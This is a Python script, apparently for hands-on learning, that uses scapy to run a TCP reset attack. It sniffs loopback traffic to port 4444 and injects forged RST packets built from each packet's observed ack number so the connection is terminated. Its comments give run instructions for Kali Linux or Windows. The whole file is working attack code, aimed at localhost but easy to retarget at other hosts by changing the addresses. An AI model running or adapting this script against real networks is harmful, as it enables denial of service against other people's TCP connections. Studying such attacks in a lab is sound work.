# || TCP Reset Attack (Simple Testing with kali linux) ||
# Localhost address 1 host apache and the other is the default host of the kali linux
# To test it out you can simply run this code and then in an other terminal you can test out the 
# Termination of a tcp connection with the command curl 127.0.0.1:4444

# Prerequisites you must have installed the apache2 server in kali linux, however you may also test it out in 
# Windows 10 with port 4444 and the localhost. From windows you can also use wireshark to view the reset tcp packets
# from this attack by simply selecting the adapter for loopback traffic capture!!!! 

# Libraries which are imported (if you have a problem with vscode simply use ctrl + shift + p -> select the correct interpreter and any unresolved imports will be fixed)
# If however you have a problem on kali linux, you may install any missing imports with pip install on any terminal 

# All libraries imported 
import random
import ifaddr
from py import log
from scapy.all import *

# This is used to set up the socket for the PF_INET domain, and it can be used to send layer 3 (network layer) data packets and it is required due to linux
conf.L3socket = L3RawSocket;

# Default window segment size
default_wind_length = 2052

# Packets from server to client (TCP connection)
def tcp_server_client(server_ip, server_port, client_ip):
    def view(result):
        if not result.haslayer(TCP):
            return False

        src_ip = result[IP].src
        src_port = result[TCP].sport
        dst_ip = result[IP].dst

        return src_ip == server_ip and src_port == server_port and dst_ip == client_ip

    return view

# Packets from client to server (TCP connection)
def tcp_client_server(server_ip, server_port, client_ip):
    def view(result):
        if not result.haslayer(TCP):
            return False

        src_ip = result[IP].src
        dst_ip = result[IP].dst
        dst_port = result[TCP].dport

        return src_ip == client_ip and dst_ip == server_ip and dst_port == server_port

    return view

# Check that log of messages shown during the process of the tcp_reset_attack
def parameter(logs, variables={}):
    changed_variables = " ".join([f"{x}={y}" for x, y in variables.items()])
    print(f"{logs} {changed_variables}")
    
    
# Localhost (127.0.0.1) adapter
def localhost(adapter, localhost_ip):
    return len([ip for ip in adapter.ips if ip.ip == localhost_ip]) > 0

# Check the packages that are in the tcp connection
def tcp_conn_packet(server_ip, server_port, client_ip):
    def view(result):
        return (
            tcp_server_client(server_ip, server_port, client_ip)(result) or tcp_client_server(server_ip, server_port, client_ip)(result))
    return view

# Reset TCP connection process, we want to ensure and prove that our Reset segment (seq no.#) has the same value as the final no. of the ack package received by the receiver
def reset_tcp(iface, sequence_segment=0, synchronize=True):

    def view(result):
        src_ip = result[IP].src
        src_port = result[TCP].sport
        dst_ip = result[IP].dst
        dst_port = result[TCP].dport
        seq = result[TCP].seq
        ack = result[TCP].ack
        flags = result[TCP].flags

        parameter(
            "Packet caught (TCP connection)",
            {
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "src_port": src_port,
                "dst_port": dst_port,
                "seq": seq,
                "ack": ack,
            }
        )

        if "S" in flags and synchronize:
            print("Packet has SYN flag, not sending RST")
            return

        rand_process = random.randint(max(-sequence_segment, -seq), sequence_segment)
        if rand_process == 0:
            print("The connection will be terminated by this reset packet!!!!")

        rst_seq = ack + rand_process
        result = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", window=default_wind_length, seq=rst_seq)

        parameter(
            "Send packets Reset tcp...",
            {
                "orig_ack": ack,
                "jitter": rand_process,
                "seq": rst_seq,
            },
        )

        send(result, verbose=0, iface=iface)

    return view

# Function used for debugging purposes only
def debug_packet(result):
    return result.show()


# Main this is where the attack begins

if __name__ == "__main__":
    ip_localhost = "127.0.0.1"
    local_ifaces = [
        adapter.name for adapter in ifaddr.get_adapters()
        if localhost(adapter, ip_localhost)
    ]
    
    server_prt_for_localhost = 4444

    iface = local_ifaces[0]
    
    parameter("Starting sniffing packets process...")
    final_res = sniff(
        iface=iface,
        count=50,
        prn=reset_tcp(iface),
        lfilter=tcp_client_server(ip_localhost, server_prt_for_localhost, ip_localhost))
    parameter("Finishing sniffing packets process!!!!")
